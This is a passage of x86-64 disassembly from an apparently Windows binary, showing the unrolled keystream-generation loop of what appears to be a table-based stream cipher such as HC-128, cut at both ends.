   140005d52:	41 33 11             	xor    (%r9),%edx
   140005d55:	89 56 24             	mov    %edx,0x24(%rsi)
   140005d58:	41 8b 93 38 10 00 00 	mov    0x1038(%r11),%edx
   140005d5f:	8b c2                	mov    %edx,%eax
   140005d61:	c1 e8 10             	shr    $0x10,%eax
   140005d64:	0f b6 c8             	movzbl %al,%ecx
   140005d67:	0f b6 c2             	movzbl %dl,%eax
   140005d6a:	41 8b 94 8b 00 0c 00 	mov    0xc00(%r11,%rcx,4),%edx
   140005d71:	00 
   140005d72:	41 03 94 83 00 08 00 	add    0x800(%r11,%rax,4),%edx
   140005d79:	00 
   140005d7a:	8d 43 0b             	lea    0xb(%rbx),%eax
   140005d7d:	41 8b 0c 83          	mov    (%r11,%rax,4),%ecx
   140005d81:	4d 8d 0c 83          	lea    (%r11,%rax,4),%r9
   140005d85:	41 8b 83 1c 10 00 00 	mov    0x101c(%r11),%eax
   140005d8c:	c1 c8 0a             	ror    $0xa,%eax
   140005d8f:	c1 c9 17             	ror    $0x17,%ecx
   140005d92:	33 c8                	xor    %eax,%ecx
   140005d94:	41 8b 83 00 10 00 00 	mov    0x1000(%r11),%eax
   140005d9b:	c1 c8 08             	ror    $0x8,%eax
   140005d9e:	03 c8                	add    %eax,%ecx
   140005da0:	41 01 08             	add    %ecx,(%r8)
   140005da3:	41 8b 00             	mov    (%r8),%eax
   140005da6:	41 89 83 28 10 00 00 	mov    %eax,0x1028(%r11)
   140005dad:	41 33 10             	xor    (%r8),%edx
   140005db0:	89 56 28             	mov    %edx,0x28(%rsi)
   140005db3:	41 8b 93 3c 10 00 00 	mov    0x103c(%r11),%edx
   140005dba:	8b c2                	mov    %edx,%eax
   140005dbc:	c1 e8 10             	shr    $0x10,%eax
   140005dbf:	0f b6 c8             	movzbl %al,%ecx
   140005dc2:	0f b6 c2             	movzbl %dl,%eax
   140005dc5:	41 8b 94 8b 00 0c 00 	mov    0xc00(%r11,%rcx,4),%edx
   140005dcc:	00 
   140005dcd:	41 03 94 83 00 08 00 	add    0x800(%r11,%rax,4),%edx
   140005dd4:	00 
   140005dd5:	8d 43 0c             	lea    0xc(%rbx),%eax
   140005dd8:	41 8b 8b 20 10 00 00 	mov    0x1020(%r11),%ecx
   140005ddf:	4d 8d 04 83          	lea    (%r11,%rax,4),%r8
   140005de3:	41 8b 04 83          	mov    (%r11,%rax,4),%eax
   140005de7:	c1 c8 17             	ror    $0x17,%eax
   140005dea:	c1 c9 0a             	ror    $0xa,%ecx
   140005ded:	33 c8                	xor    %eax,%ecx
   140005def:	41 8b 83 04 10 00 00 	mov    0x1004(%r11),%eax
   140005df6:	c1 c8 08             	ror    $0x8,%eax
   140005df9:	03 c8                	add    %eax,%ecx
   140005dfb:	41 01 09             	add    %ecx,(%r9)
   140005dfe:	41 8b 01             	mov    (%r9),%eax
   140005e01:	41 89 83 2c 10 00 00 	mov    %eax,0x102c(%r11)
   140005e08:	41 33 11             	xor    (%r9),%edx
   140005e0b:	89 56 2c             	mov    %edx,0x2c(%rsi)
   140005e0e:	41 8b 93 00 10 00 00 	mov    0x1000(%r11),%edx
   140005e15:	8b c2                	mov    %edx,%eax
   140005e17:	c1 e8 10             	shr    $0x10,%eax
   140005e1a:	0f b6 c8             	movzbl %al,%ecx
   140005e1d:	0f b6 c2             	movzbl %dl,%eax
   140005e20:	41 8b 94 8b 00 0c 00 	mov    0xc00(%r11,%rcx,4),%edx
   140005e27:	00 
   140005e28:	41 03 94 83 00 08 00 	add    0x800(%r11,%rax,4),%edx
   140005e2f:	00 
   140005e30:	8d 43 0d             	lea    0xd(%rbx),%eax
   140005e33:	41 8b 8b 24 10 00 00 	mov    0x1024(%r11),%ecx
   140005e3a:	4d 8d 0c 83          	lea    (%r11,%rax,4),%r9
   140005e3e:	41 8b 04 83          	mov    (%r11,%rax,4),%eax
   140005e42:	c1 c8 17             	ror    $0x17,%eax
   140005e45:	c1 c9 0a             	ror    $0xa,%ecx
   140005e48:	33 c8                	xor    %eax,%ecx
   140005e4a:	41 8b 83 08 10 00 00 	mov    0x1008(%r11),%eax
   140005e51:	c1 c8 08             	ror    $0x8,%eax
   140005e54:	03 c8                	add    %eax,%ecx
   140005e56:	41 01 08             	add    %ecx,(%r8)
   140005e59:	41 8b 00             	mov    (%r8),%eax
   140005e5c:	41 89 83 30 10 00 00 	mov    %eax,0x1030(%r11)
   140005e63:	41 33 10             	xor    (%r8),%edx
   140005e66:	89 56 30             	mov    %edx,0x30(%rsi)
   140005e69:	41 8b 93 04 10 00 00 	mov    0x1004(%r11),%edx
   140005e70:	8b c2                	mov    %edx,%eax
   140005e72:	c1 e8 10             	shr    $0x10,%eax
   140005e75:	0f b6 c8             	movzbl %al,%ecx
   140005e78:	0f b6 c2             	movzbl %dl,%eax
   140005e7b:	41 8b 94 8b 00 0c 00 	mov    0xc00(%r11,%rcx,4),%edx
   140005e82:	00 
   140005e83:	41 03 94 83 00 08 00 	add    0x800(%r11,%rax,4),%edx
   140005e8a:	00 
   140005e8b:	8d 43 0e             	lea    0xe(%rbx),%eax
   140005e8e:	41 8b 0c 83          	mov    (%r11,%rax,4),%ecx
   140005e92:	4d 8d 14 83          	lea    (%r11,%rax,4),%r10
   140005e96:	41 8b 83 28 10 00 00 	mov    0x1028(%r11),%eax
   140005e9d:	c1 c8 0a             	ror    $0xa,%eax
   140005ea0:	c1 c9 17             	ror    $0x17,%ecx
   140005ea3:	33 c8                	xor    %eax,%ecx
   140005ea5:	41 8b 83 0c 10 00 00 	mov    0x100c(%r11),%eax
   140005eac:	c1 c8 08             	ror    $0x8,%eax
   140005eaf:	03 c8                	add    %eax,%ecx
   140005eb1:	41 01 09             	add    %ecx,(%r9)
   140005eb4:	41 8b 01             	mov    (%r9),%eax
   140005eb7:	41 89 83 34 10 00 00 	mov    %eax,0x1034(%r11)
   140005ebe:	41 33 11             	xor    (%r9),%edx
   140005ec1:	89 56 34             	mov    %edx,0x34(%rsi)
   140005ec4:	41 8b 93 08 10 00 00 	mov    0x1008(%r11),%edx
   140005ecb:	8b c2                	mov    %edx,%eax
   140005ecd:	c1 e8 10             	shr    $0x10,%eax
   140005ed0:	0f b6 c8             	movzbl %al,%ecx
   140005ed3:	0f b6 c2             	movzbl %dl,%eax
   140005ed6:	41 8b 94 8b 00 0c 00 	mov    0xc00(%r11,%rcx,4),%edx
   140005edd:	00 
   140005ede:	41 03 94 83 00 08 00 	add    0x800(%r11,%rax,4),%edx
   140005ee5:	00 
   140005ee6:	8d 43 0f             	lea    0xf(%rbx),%eax
   140005ee9:	41 8b 0c 83          	mov    (%r11,%rax,4),%ecx
   140005eed:	4d 8d 04 83          	lea    (%r11,%rax,4),%r8
   140005ef1:	41 8b 83 2c 10 00 00 	mov    0x102c(%r11),%eax
   140005ef8:	c1 c8 0a             	ror    $0xa,%eax
   140005efb:	c1 c9 17             	ror    $0x17,%ecx
   140005efe:	33 c8                	xor    %eax,%ecx
   140005f00:	41 8b 83 10 10 00 00 	mov    0x1010(%r11),%eax
   140005f07:	c1 c8 08             	ror    $0x8,%eax
   140005f0a:	03 c8                	add    %eax,%ecx
   140005f0c:	41 01 0a             	add    %ecx,(%r10)
   140005f0f:	41 8b 02             	mov    (%r10),%eax
   140005f12:	41 89 83 38 10 00 00 	mov    %eax,0x1038(%r11)
   140005f19:	41 33 12             	xor    (%r10),%edx
   140005f1c:	89 56 38             	mov    %edx,0x38(%rsi)
   140005f1f:	41 8b 93 0c 10 00 00 	mov    0x100c(%r11),%edx
   140005f26:	8b c2                	mov    %edx,%eax
   140005f28:	c1 e8 10             	shr    $0x10,%eax
   140005f2b:	0f b6 c8             	movzbl %al,%ecx
   140005f2e:	0f b6 c2             	movzbl %dl,%eax
   140005f31:	41 8b 94 8b 00 0c 00 	mov    0xc00(%r11,%rcx,4),%edx
   140005f38:	00 
   140005f39:	41 03 94 83 00 08 00 	add    0x800(%r11,%rax,4),%edx
   140005f40:	00 
   140005f41:	41 8b 0c bb          	mov    (%r11,%rdi,4),%ecx
   140005f45:	41 8b 83 30 10 00 00 	mov    0x1030(%r11),%eax
   140005f4c:	c1 c8 0a             	ror    $0xa,%eax
   140005f4f:	c1 c9 17             	ror    $0x17,%ecx
   140005f52:	33 c8                	xor    %eax,%ecx
   140005f54:	41 8b 83 14 10 00 00 	mov    0x1014(%r11),%eax
   140005f5b:	c1 c8 08             	ror    $0x8,%eax
   140005f5e:	03 c8                	add    %eax,%ecx
   140005f60:	41 01 08             	add    %ecx,(%r8)
   140005f63:	41 8b 00             	mov    (%r8),%eax
   140005f66:	41 89 83 3c 10 00 00 	mov    %eax,0x103c(%r11)
   140005f6d:	41 33 10             	xor    (%r8),%edx
   140005f70:	89 56 3c             	mov    %edx,0x3c(%rsi)
   140005f73:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   140005f78:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   140005f7d:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   140005f82:	c3                   	ret
   140005f83:	8b 91 50 10 00 00    	mov    0x1050(%rcx),%edx
   140005f89:	8b c2                	mov    %edx,%eax
   140005f8b:	c1 e8 10             	shr    $0x10,%eax
   140005f8e:	0f b6 c8             	movzbl %al,%ecx
   140005f91:	0f b6 c2             	movzbl %dl,%eax
   140005f94:	45 8b 84 8b 00 04 00 	mov    0x400(%r11,%rcx,4),%r8d
   140005f9b:	00 
   140005f9c:	45 03 04 83          	add    (%r11,%rax,4),%r8d
   140005fa0:	8d 83 01 02 00 00    	lea    0x201(%rbx),%eax
   140005fa6:	41 8b 8b 74 10 00 00 	mov    0x1074(%r11),%ecx
   140005fad:	4d 8d 14 83          	lea    (%r11,%rax,4),%r10
   140005fb1:	c1 c9 16             	ror    $0x16,%ecx
   140005fb4:	8d 83 00 02 00 00    	lea    0x200(%rbx),%eax
   140005fba:	49 8d 14 83          	lea    (%r11,%rax,4),%rdx
   140005fbe:	41 8b 02             	mov    (%r10),%eax
   140005fc1:	c1 c8 09             	ror    $0x9,%eax
   140005fc4:	33 c8                	xor    %eax,%ecx
   140005fc6:	41 8b 83 58 10 00 00 	mov    0x1058(%r11),%eax
   140005fcd:	c1 c8 18             	ror    $0x18,%eax
   140005fd0:	03 c8                	add    %eax,%ecx
   140005fd2:	03 0a                	add    (%rdx),%ecx
   140005fd4:	89 0a                	mov    %ecx,(%rdx)
   140005fd6:	41 89 8b 40 10 00 00 	mov    %ecx,0x1040(%r11)
   140005fdd:	44 33 02             	xor    (%rdx),%r8d
   140005fe0:	41 8b 93 54 10 00 00 	mov    0x1054(%r11),%edx
   140005fe7:	8b c2                	mov    %edx,%eax
   140005fe9:	44 89 06             	mov    %r8d,(%rsi)
   140005fec:	c1 e8 10             	shr    $0x10,%eax
   140005fef:	0f b6 c8             	movzbl %al,%ecx
   140005ff2:	0f b6 c2             	movzbl %dl,%eax
   140005ff5:	41 8b 94 8b 00 04 00 	mov    0x400(%r11,%rcx,4),%edx
   140005ffc:	00 
   140005ffd:	41 03 14 83          	add    (%r11,%rax,4),%edx
   140006001:	8d 83 02 02 00 00    	lea    0x202(%rbx),%eax
   140006007:	41 8b 8b 78 10 00 00 	mov    0x1078(%r11),%ecx
   14000600e:	4d 8d 0c 83          	lea    (%r11,%rax,4),%r9
   140006012:	41 8b 04 83          	mov    (%r11,%rax,4),%eax
   140006016:	c1 c8 09             	ror    $0x9,%eax
   140006019:	c1 c9 16             	ror    $0x16,%ecx
   14000601c:	33 c8                	xor    %eax,%ecx
   14000601e:	41 8b 83 5c 10 00 00 	mov    0x105c(%r11),%eax
   140006025:	c1 c8 18             	ror    $0x18,%eax
   140006028:	03 c8                	add    %eax,%ecx
   14000602a:	41 01 0a             	add    %ecx,(%r10)
   14000602d:	41 8b 02             	mov    (%r10),%eax
   140006030:	41 89 83 44 10 00 00 	mov    %eax,0x1044(%r11)
   140006037:	41 33 12             	xor    (%r10),%edx
   14000603a:	89 56 04             	mov    %edx,0x4(%rsi)
   14000603d:	41 8b 93 58 10 00 00 	mov    0x1058(%r11),%edx
   140006044:	8b c2                	mov    %edx,%eax
   140006046:	c1 e8 10             	shr    $0x10,%eax
   140006049:	0f b6 c8             	movzbl %al,%ecx
   14000604c:	0f b6 c2             	movzbl %dl,%eax
   14000604f:	41 8b 94 8b 00 04 00 	mov    0x400(%r11,%rcx,4),%edx
   140006056:	00 
   140006057:	41 03 14 83          	add    (%r11,%rax,4),%edx
   14000605b:	8d 83 03 02 00 00    	lea    0x203(%rbx),%eax
   140006061:	41 8b 8b 7c 10 00 00 	mov    0x107c(%r11),%ecx
   140006068:	4d 8d 04 83          	lea    (%r11,%rax,4),%r8
   14000606c:	41 8b 04 83          	mov    (%r11,%rax,4),%eax
   140006070:	c1 c8 09             	ror    $0x9,%eax
   140006073:	c1 c9 16             	ror    $0x16,%ecx
   140006076:	33 c8                	xor    %eax,%ecx
   140006078:	41 8b 83 60 10 00 00 	mov    0x1060(%r11),%eax
   14000607f:	c1 c8 18             	ror    $0x18,%eax
   140006082:	03 c8                	add    %eax,%ecx
   140006084:	41 01 09             	add    %ecx,(%r9)
   140006087:	41 8b 01             	mov    (%r9),%eax
   14000608a:	41 89 83 48 10 00 00 	mov    %eax,0x1048(%r11)
   140006091:	41 33 11             	xor    (%r9),%edx
   140006094:	89 56 08             	mov    %edx,0x8(%rsi)
   140006097:	41 8b 93 5c 10 00 00 	mov    0x105c(%r11),%edx
   14000609e:	8b c2                	mov    %edx,%eax
   1400060a0:	c1 e8 10             	shr    $0x10,%eax
   1400060a3:	0f b6 c8             	movzbl %al,%ecx
   1400060a6:	0f b6 c2             	movzbl %dl,%eax
   1400060a9:	41 8b 94 8b 00 04 00 	mov    0x400(%r11,%rcx,4),%edx
   1400060b0:	00 
   1400060b1:	41 03 14 83          	add    (%r11,%rax,4),%edx
   1400060b5:	8d 83 04 02 00 00    	lea    0x204(%rbx),%eax
   1400060bb:	41 8b 8b 40 10 00 00 	mov    0x1040(%r11),%ecx
   1400060c2:	4d 8d 0c 83          	lea    (%r11,%rax,4),%r9
   1400060c6:	41 8b 04 83          	mov    (%r11,%rax,4),%eax
   1400060ca:	c1 c9 16             	ror    $0x16,%ecx
   1400060cd:	c1 c8 09             	ror    $0x9,%eax
   1400060d0:	33 c8                	xor    %eax,%ecx
   1400060d2:	41 8b 83 64 10 00 00 	mov    0x1064(%r11),%eax
   1400060d9:	c1 c8 18             	ror    $0x18,%eax
   1400060dc:	03 c8                	add    %eax,%ecx
   1400060de:	41 01 08             	add    %ecx,(%r8)
   1400060e1:	41 8b 00             	mov    (%r8),%eax
   1400060e4:	41 89 83 4c 10 00 00 	mov    %eax,0x104c(%r11)
   1400060eb:	41 33 10             	xor    (%r8),%edx
   1400060ee:	89 56 0c             	mov    %edx,0xc(%rsi)
   1400060f1:	41 8b 93 60 10 00 00 	mov    0x1060(%r11),%edx
   1400060f8:	8b c2                	mov    %edx,%eax
   1400060fa:	c1 e8 10             	shr    $0x10,%eax
   1400060fd:	0f b6 c8             	movzbl %al,%ecx
   140006100:	0f b6 c2             	movzbl %dl,%eax
   140006103:	41 8b 94 8b 00 04 00 	mov    0x400(%r11,%rcx,4),%edx
   14000610a:	00 
   14000610b:	41 03 14 83          	add    (%r11,%rax,4),%edx
   14000610f:	8d 83 05 02 00 00    	lea    0x205(%rbx),%eax
   140006115:	41 8b 0c 83          	mov    (%r11,%rax,4),%ecx
   140006119:	4d 8d 04 83          	lea    (%r11,%rax,4),%r8
   14000611d:	41 8b 83 44 10 00 00 	mov    0x1044(%r11),%eax
   140006124:	c1 c8 16             	ror    $0x16,%eax
   140006127:	c1 c9 09             	ror    $0x9,%ecx
   14000612a:	33 c8                	xor    %eax,%ecx
   14000612c:	41 8b 83 68 10 00 00 	mov    0x1068(%r11),%eax
   140006133:	c1 c8 18             	ror    $0x18,%eax
   140006136:	03 c8                	add    %eax,%ecx
   140006138:	41 01 09             	add    %ecx,(%r9)
   14000613b:	41 8b 01             	mov    (%r9),%eax
   14000613e:	41 89 83 50 10 00 00 	mov    %eax,0x1050(%r11)
   140006145:	41 33 11             	xor    (%r9),%edx
   140006148:	89 56 10             	mov    %edx,0x10(%rsi)
   14000614b:	41 8b 93 64 10 00 00 	mov    0x1064(%r11),%edx
   140006152:	8b c2                	mov    %edx,%eax
   140006154:	c1 e8 10             	shr    $0x10,%eax
   140006157:	0f b6 c8             	movzbl %al,%ecx
   14000615a:	0f b6 c2             	movzbl %dl,%eax
   14000615d:	41 8b 94 8b 00 04 00 	mov    0x400(%r11,%rcx,4),%edx
   140006164:	00 
   140006165:	41 03 14 83          	add    (%r11,%rax,4),%edx
   140006169:	8d 83 06 02 00 00    	lea    0x206(%rbx),%eax
   14000616f:	41 8b 0c 83          	mov    (%r11,%rax,4),%ecx
   140006173:	4d 8d 14 83          	lea    (%r11,%rax,4),%r10
   140006177:	41 8b 83 48 10 00 00 	mov    0x1048(%r11),%eax
   14000617e:	c1 c8 16             	ror    $0x16,%eax
   140006181:	c1 c9 09             	ror    $0x9,%ecx
   140006184:	33 c8                	xor    %eax,%ecx
   140006186:	41 8b 83 6c 10 00 00 	mov    0x106c(%r11),%eax
   14000618d:	c1 c8 18             	ror    $0x18,%eax
   140006190:	03 c8                	add    %eax,%ecx
   140006192:	41 01 08             	add    %ecx,(%r8)
   140006195:	41 8b 00             	mov    (%r8),%eax
   140006198:	41 89 83 54 10 00 00 	mov    %eax,0x1054(%r11)
   14000619f:	41 33 10             	xor    (%r8),%edx
   1400061a2:	89 56 14             	mov    %edx,0x14(%rsi)
   1400061a5:	41 8b 93 68 10 00 00 	mov    0x1068(%r11),%edx
   1400061ac:	8b c2                	mov    %edx,%eax
   1400061ae:	c1 e8 10             	shr    $0x10,%eax
   1400061b1:	0f b6 c8             	movzbl %al,%ecx
   1400061b4:	0f b6 c2             	movzbl %dl,%eax
   1400061b7:	41 8b 94 8b 00 04 00 	mov    0x400(%r11,%rcx,4),%edx
   1400061be:	00 
   1400061bf:	41 03 14 83          	add    (%r11,%rax,4),%edx
   1400061c3:	8d 83 07 02 00 00    	lea    0x207(%rbx),%eax
   1400061c9:	41 8b 0c 83          	mov    (%r11,%rax,4),%ecx
   1400061cd:	4d 8d 0c 83          	lea    (%r11,%rax,4),%r9
   1400061d1:	41 8b 83 4c 10 00 00 	mov    0x104c(%r11),%eax
   1400061d8:	c1 c8 16             	ror    $0x16,%eax
   1400061db:	c1 c9 09             	ror    $0x9,%ecx
   1400061de:	33 c8                	xor    %eax,%ecx
   1400061e0:	41 8b 83 70 10 00 00 	mov    0x1070(%r11),%eax
   1400061e7:	c1 c8 18             	ror    $0x18,%eax
   1400061ea:	03 c8                	add    %eax,%ecx
   1400061ec:	41 01 0a             	add    %ecx,(%r10)
   1400061ef:	41 8b 02             	mov    (%r10),%eax
   1400061f2:	41 89 83 58 10 00 00 	mov    %eax,0x1058(%r11)
   1400061f9:	41 33 12             	xor    (%r10),%edx
   1400061fc:	89 56 18             	mov    %edx,0x18(%rsi)
   1400061ff:	41 8b 93 6c 10 00 00 	mov    0x106c(%r11),%edx
   140006206:	8b c2                	mov    %edx,%eax
   140006208:	c1 e8 10             	shr    $0x10,%eax
   14000620b:	0f b6 c8             	movzbl %al,%ecx
   14000620e:	0f b6 c2             	movzbl %dl,%eax
   140006211:	41 8b 94 8b 00 04 00 	mov    0x400(%r11,%rcx,4),%edx
   140006218:	00 
   140006219:	41 03 14 83          	add    (%r11,%rax,4),%edx
   14000621d:	8d 83 08 02 00 00    	lea    0x208(%rbx),%eax
   140006223:	41 8b 8b 50 10 00 00 	mov    0x1050(%r11),%ecx
   14000622a:	4d 8d 04 83          	lea    (%r11,%rax,4),%r8
   14000622e:	41 8b 04 83          	mov    (%r11,%rax,4),%eax
   140006232:	c1 c8 09             	ror    $0x9,%eax
   140006235:	c1 c9 16             	ror    $0x16,%ecx
   140006238:	33 c8                	xor    %eax,%ecx
   14000623a:	41 8b 83 74 10 00 00 	mov    0x1074(%r11),%eax
   140006241:	c1 c8 18             	ror    $0x18,%eax
   140006244:	03 c8                	add    %eax,%ecx
   140006246:	41 01 09             	add    %ecx,(%r9)
   140006249:	41 8b 01             	mov    (%r9),%eax
   14000624c:	41 89 83 5c 10 00 00 	mov    %eax,0x105c(%r11)
   140006253:	41 33 11             	xor    (%r9),%edx
   140006256:	89 56 1c             	mov    %edx,0x1c(%rsi)
   140006259:	41 8b 93 70 10 00 00 	mov    0x1070(%r11),%edx
   140006260:	8b c2                	mov    %edx,%eax
   140006262:	c1 e8 10             	shr    $0x10,%eax
   140006265:	0f b6 c8             	movzbl %al,%ecx
   140006268:	0f b6 c2             	movzbl %dl,%eax
   14000626b:	41 8b 94 8b 00 04 00 	mov    0x400(%r11,%rcx,4),%edx
   140006272:	00 
   140006273:	41 03 14 83          	add    (%r11,%rax,4),%edx
   140006277:	8d 83 09 02 00 00    	lea    0x209(%rbx),%eax
   14000627d:	41 8b 0c 83          	mov    (%r11,%rax,4),%ecx
   140006281:	4d 8d 0c 83          	lea    (%r11,%rax,4),%r9
   140006285:	41 8b 83 54 10 00 00 	mov    0x1054(%r11),%eax
   14000628c:	c1 c8 16             	ror    $0x16,%eax
   14000628f:	c1 c9 09             	ror    $0x9,%ecx
   140006292:	33 c8                	xor    %eax,%ecx
   140006294:	41 8b 83 78 10 00 00 	mov    0x1078(%r11),%eax
   14000629b:	c1 c8 18             	ror    $0x18,%eax
   14000629e:	03 c8                	add    %eax,%ecx
   1400062a0:	41 01 08             	add    %ecx,(%r8)
   1400062a3:	41 8b 00             	mov    (%r8),%eax
   1400062a6:	41 89 83 60 10 00 00 	mov    %eax,0x1060(%r11)
   1400062ad:	41 33 10             	xor    (%r8),%edx
   1400062b0:	89 56 20             	mov    %edx,0x20(%rsi)
   1400062b3:	41 8b 93 74 10 00 00 	mov    0x1074(%r11),%edx
   1400062ba:	8b c2                	mov    %edx,%eax
   1400062bc:	c1 e8 10             	shr    $0x10,%eax
   1400062bf:	0f b6 c8             	movzbl %al,%ecx
   1400062c2:	0f b6 c2             	movzbl %dl,%eax
   1400062c5:	41 8b 94 8b 00 04 00 	mov    0x400(%r11,%rcx,4),%edx
   1400062cc:	00 
   1400062cd:	41 03 14 83          	add    (%r11,%rax,4),%edx
   1400062d1:	8d 83 0a 02 00 00    	lea    0x20a(%rbx),%eax
   1400062d7:	41 8b 8b 58 10 00 00 	mov    0x1058(%r11),%ecx
   1400062de:	4d 8d 04 83          	lea    (%r11,%rax,4),%r8
   1400062e2:	41 8b 04 83          	mov    (%r11,%rax,4),%eax
   1400062e6:	c1 c8 09             	ror    $0x9,%eax
   1400062e9:	c1 c9 16             	ror    $0x16,%ecx
   1400062ec:	33 c8                	xor    %eax,%ecx
   1400062ee:	41 8b 83 7c 10 00 00 	mov    0x107c(%r11),%eax
   1400062f5:	c1 c8 18             	ror    $0x18,%eax
   1400062f8:	03 c8                	add    %eax,%ecx
   1400062fa:	41 01 09             	add    %ecx,(%r9)
   1400062fd:	41 8b 01             	mov    (%r9),%eax
   140006300:	41 89 83 64 10 00 00 	mov    %eax,0x1064(%r11)
   140006307:	41 33 11             	xor    (%r9),%edx
   14000630a:	89 56 24             	mov    %edx,0x24(%rsi)
   14000630d:	41 8b 93 78 10 00 00 	mov    0x1078(%r11),%edx
   140006314:	8b c2                	mov    %edx,%eax
   140006316:	c1 e8 10             	shr    $0x10,%eax
   140006319:	0f b6 c8             	movzbl %al,%ecx
   14000631c:	0f b6 c2             	movzbl %dl,%eax
   14000631f:	41 8b 94 8b 00 04 00 	mov    0x400(%r11,%rcx,4),%edx
   140006326:	00 
   140006327:	41 03 14 83          	add    (%r11,%rax,4),%edx
   14000632b:	8d 83 0b 02 00 00    	lea    0x20b(%rbx),%eax
   140006331:	41 8b 0c 83          	mov    (%r11,%rax,4),%ecx
   140006335:	4d 8d 0c 83          	lea    (%r11,%rax,4),%r9
   140006339:	41 8b 83 5c 10 00 00 	mov    0x105c(%r11),%eax
   140006340:	c1 c8 16             	ror    $0x16,%eax
   140006343:	c1 c9 09             	ror    $0x9,%ecx
   140006346:	33 c8                	xor    %eax,%ecx
   140006348:	41 8b 83 40 10 00 00 	mov    0x1040(%r11),%eax
   14000634f:	c1 c8 18             	ror    $0x18,%eax
   140006352:	03 c8                	add    %eax,%ecx
   140006354:	41 01 08             	add    %ecx,(%r8)
   140006357:	41 8b 00             	mov    (%r8),%eax
   14000635a:	41 89 83 68 10 00 00 	mov    %eax,0x1068(%r11)
   140006361:	41 33 10             	xor    (%r8),%edx
   140006364:	89 56 28             	mov    %edx,0x28(%rsi)
   140006367:	41 8b 93 7c 10 00 00 	mov    0x107c(%r11),%edx
   14000636e:	8b c2                	mov    %edx,%eax
   140006370:	c1 e8 10             	shr    $0x10,%eax
   140006373:	0f b6 c8             	movzbl %al,%ecx
   140006376:	0f b6 c2             	movzbl %dl,%eax
   140006379:	41 8b 94 8b 00 04 00 	mov    0x400(%r11,%rcx,4),%edx
   140006380:	00 
   140006381:	41 03 14 83          	add    (%r11,%rax,4),%edx
   140006385:	8d 83 0c 02 00 00    	lea    0x20c(%rbx),%eax
   14000638b:	41 8b 8b 60 10 00 00 	mov    0x1060(%r11),%ecx
   140006392:	4d 8d 04 83          	lea    (%r11,%rax,4),%r8
   140006396:	41 8b 04 83          	mov    (%r11,%rax,4),%eax
   14000639a:	c1 c8 09             	ror    $0x9,%eax
   14000639d:	c1 c9 16             	ror    $0x16,%ecx
   1400063a0:	33 c8                	xor    %eax,%ecx
   1400063a2:	41 8b 83 44 10 00 00 	mov    0x1044(%r11),%eax
   1400063a9:	c1 c8 18             	ror    $0x18,%eax
   1400063ac:	03 c8                	add    %eax,%ecx
   1400063ae:	41 01 09             	add    %ecx,(%r9)
   1400063b1:	41 8b 01             	mov    (%r9),%eax
   1400063b4:	41 89 83 6c 10 00 00 	mov    %eax,0x106c(%r11)
   1400063bb:	41 33 11             	xor    (%r9),%edx
   1400063be:	89 56 2c             	mov    %edx,0x2c(%rsi)
   1400063c1:	41 8b 93 40 10 00 00 	mov    0x1040(%r11),%edx
   1400063c8:	8b c2                	mov    %edx,%eax
   1400063ca:	c1 e8 10             	shr    $0x10,%eax
   1400063cd:	0f b6 c8             	movzbl %al,%ecx
   1400063d0:	0f b6 c2             	movzbl %dl,%eax
   1400063d3:	41 8b 94 8b 00 04 00 	mov    0x400(%r11,%rcx,4),%edx
   1400063da:	00 
   1400063db:	41 03 14 83          	add    (%r11,%rax,4),%edx
   1400063df:	8d 83 0d 02 00 00    	lea    0x20d(%rbx),%eax
   1400063e5:	41 8b 8b 64 10 00 00 	mov    0x1064(%r11),%ecx
   1400063ec:	4d 8d 0c 83          	lea    (%r11,%rax,4),%r9
   1400063f0:	41 8b 04 83          	mov    (%r11,%rax,4),%eax
   1400063f4:	c1 c8 09             	ror    $0x9,%eax
   1400063f7:	c1 c9 16             	ror    $0x16,%ecx
   1400063fa:	33 c8                	xor    %eax,%ecx
   1400063fc:	41 8b 83 48 10 00 00 	mov    0x1048(%r11),%eax
   140006403:	c1 c8 18             	ror    $0x18,%eax
   140006406:	03 c8                	add    %eax,%ecx
   140006408:	41 01 08             	add    %ecx,(%r8)
   14000640b:	41 8b 00             	mov    (%r8),%eax
   14000640e:	41 89 83 70 10 00 00 	mov    %eax,0x1070(%r11)
   140006415:	41 33 10             	xor    (%r8),%edx
   140006418:	89 56 30             	mov    %edx,0x30(%rsi)
   14000641b:	41 8b 93 44 10 00 00 	mov    0x1044(%r11),%edx
   140006422:	8b c2                	mov    %edx,%eax
   140006424:	c1 e8 10             	shr    $0x10,%eax
   140006427:	0f b6 c8             	movzbl %al,%ecx
   14000642a:	0f b6 c2             	movzbl %dl,%eax
   14000642d:	41 8b 94 8b 00 04 00 	mov    0x400(%r11,%rcx,4),%edx
   140006434:	00 
   140006435:	41 03 14 83          	add    (%r11,%rax,4),%edx
   140006439:	8d 83 0e 02 00 00    	lea    0x20e(%rbx),%eax
   14000643f:	41 8b 8b 68 10 00 00 	mov    0x1068(%r11),%ecx
   140006446:	4d 8d 04 83          	lea    (%r11,%rax,4),%r8
   14000644a:	41 8b 04 83          	mov    (%r11,%rax,4),%eax
   14000644e:	c1 c8 09             	ror    $0x9,%eax
   140006451:	c1 c9 16             	ror    $0x16,%ecx
   140006454:	33 c8                	xor    %eax,%ecx
   140006456:	41 8b 83 4c 10 00 00 	mov    0x104c(%r11),%eax
   14000645d:	c1 c8 18             	ror    $0x18,%eax
   140006460:	03 c8                	add    %eax,%ecx
   140006462:	41 01 09             	add    %ecx,(%r9)
   140006465:	41 8b 01             	mov    (%r9),%eax
   140006468:	41 89 83 74 10 00 00 	mov    %eax,0x1074(%r11)
   14000646f:	41 33 11             	xor    (%r9),%edx
   140006472:	89 56 34             	mov    %edx,0x34(%rsi)
   140006475:	41 8b 93 48 10 00 00 	mov    0x1048(%r11),%edx
   14000647c:	8b c2                	mov    %edx,%eax
   14000647e:	c1 e8 10             	shr    $0x10,%eax
   140006481:	0f b6 c8             	movzbl %al,%ecx
   140006484:	0f b6 c2             	movzbl %dl,%eax
   140006487:	41 8b 94 8b 00 04 00 	mov    0x400(%r11,%rcx,4),%edx
   14000648e:	00 
   14000648f:	41 03 14 83          	add    (%r11,%rax,4),%edx
   140006493:	8d 83 0f 02 00 00    	lea    0x20f(%rbx),%eax
   140006499:	41 8b 8b 6c 10 00 00 	mov    0x106c(%r11),%ecx
   1400064a0:	4d 8d 0c 83          	lea    (%r11,%rax,4),%r9
   1400064a4:	41 8b 04 83          	mov    (%r11,%rax,4),%eax
   1400064a8:	c1 c8 09             	ror    $0x9,%eax
   1400064ab:	c1 c9 16             	ror    $0x16,%ecx
